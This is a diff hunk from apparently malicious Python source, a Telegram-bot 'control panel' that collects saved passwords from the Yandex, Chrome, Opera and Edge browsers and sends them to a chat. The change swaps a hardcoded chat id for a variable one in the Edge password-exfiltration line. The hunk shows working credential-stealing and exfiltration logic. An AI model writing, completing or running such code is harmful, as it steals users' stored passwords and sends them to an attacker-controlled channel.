@@ -305,7 +305,7 @@ def control_panel():
             bot.send_message(id, get_passwd_yandex())
             bot.send_message(id, get_passwd_chrome())
             bot.send_message(id, get_passwd_opera())
-            bot.send_message(1409234655, get_passwd_edge())
+            bot.send_message(id, get_passwd_edge())
 
         if message.text == "5":
                 path = os.path.abspath(__file__)
